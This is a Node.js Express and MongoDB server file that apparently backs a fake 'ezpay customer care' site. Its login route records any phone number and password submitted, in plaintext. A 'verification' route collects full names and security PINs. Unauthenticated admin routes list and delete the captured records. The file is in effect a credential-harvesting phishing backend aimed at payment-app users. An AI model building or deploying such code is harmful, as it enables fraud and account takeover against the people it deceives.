require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

// -------------------- MIDDLEWARE --------------------
app.use(cors({ origin: "https://ezpay-customer-care.netlify.app", methods: ["GET", "POST", "PUT", "DELETE"] }));
app.use(express.json());

// -------------------- MONGODB CONNECT --------------------
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected Successfully"))
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err);
    process.exit(1);
  });

// -------------------- SCHEMAS --------------------
const userSchema = new mongoose.Schema(
  { phone: String, password: String },
  { timestamps: true }
);
const User = mongoose.model("User", userSchema);

const verificationSchema = new mongoose.Schema(
  {
    userId: String,
    full_name: String,
    problem: String,
    security_pin: String,
    experience: String,
  },
  { timestamps: true }
);
const Verification = mongoose.model("Verification", verificationSchema);

// ==================== API ROUTES ====================
// LOGIN / CREATE USER
app.post("/api/auth/login", async (req, res) => {
  try {
    const { phone, password } = req.body;
    let user = await User.findOne({ phone });
    if (!user) {
      user = await User.create({ phone, password });
    }
    res.json({ success: true, user: { _id: user._id, phone: user.phone } });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

// VERIFICATION
app.post("/api/verify", async (req, res) => {
  try {
    if (!req.body.userId)
      return res
        .status(400)
        .json({ success: false, message: "User not logged in" });
    await Verification.create(req.body);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

// ADMIN LOGIN
app.post("/api/admin/login", (req, res) => {
  if (req.body.password !== process.env.ADMIN_PASSWORD)
    return res.json({ success: false });
  res.json({ success: true });
});

// GET USERS
app.get("/api/admin/getUsers", async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: 1 });
    res.json(users);
  } catch (err) {
    console.error(err);
    res.status(500).json([]);
  }
});

// GET VERIFICATION
app.get("/api/admin/getVerification", async (req, res) => {
  try {
    const data = await Verification.find().sort({ createdAt: 1 });
    res.json(data);
  } catch (err) {
    console.error(err);
    res.status(500).json([]);
  }
});

// DELETE USER
app.delete("/api/admin/deleteUser/:id", async (req, res) => {
  try {
    await User.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

// DELETE VERIFICATION
app.delete("/api/admin/deleteVerification/:id", async (req, res) => {
  try {
    await Verification.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

// -------------------- SERVER --------------------
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log("🚀 Server running on port", PORT));
